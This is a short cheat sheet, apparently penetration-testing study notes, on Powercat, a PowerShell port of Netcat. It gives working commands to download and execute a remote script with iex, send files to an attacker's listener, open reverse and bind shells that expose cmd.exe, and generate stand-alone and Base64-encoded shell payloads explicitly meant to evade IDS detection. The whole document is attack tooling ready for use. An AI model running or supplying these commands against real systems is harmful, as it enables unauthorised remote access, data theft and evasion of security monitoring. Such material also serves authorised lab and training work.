Powercat

Netcat for PowerShell

  • apt install powercat > script will be placed in /usr/share/windows-resources/powercat in kali > transfer to windows

Loading the script

  • loading a local PowerShell script using dot sourcing

../powercat.ps1

  • loading a remote PowerShell script using iex

iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') 

File Transfer

kali@linux:~$ sudo nc -lnvp 443 > receiving_powercat.ps1  creating a listener on kali to recieve file 
PS c:\win> powercat -c 10.11.0.4 -p 443 -i c:\powercat.ps1 
-c for client mode and listener's IP, -p for port and -i to specify file path
-l to create a listener 

Reverse Shell

  • kali@attacker:~$ sudo nc -lvp 443
  • PS c:\target> powercat -c 10.11.0.4 -p 443 -e cmd.exe

Bind Shell

  • PS c:\target> powercat -l -p 443 -e cmd.exe
  • kali@attacker:~$ nc 10.11.0.22 443

Stand-Alone Payloads

kali@attacker:~$ sudo nc -lnvp 443  kali started a listener 
PS c:\win> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1  -g to create a stand-alone payload and redirect the output to a file 
PS c:\target> ./reverseshell.ps1  when executed kali will have remote access to cmd 
PS c:\win> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1  -ge to create a Base64 encoded payload to avoid detection by IDS and redirect the output to a file  
PS c:\target> powershell.exe -E SCRIPT  to execute an encoded script open it in a text editor and copy & paste the SCRIPT
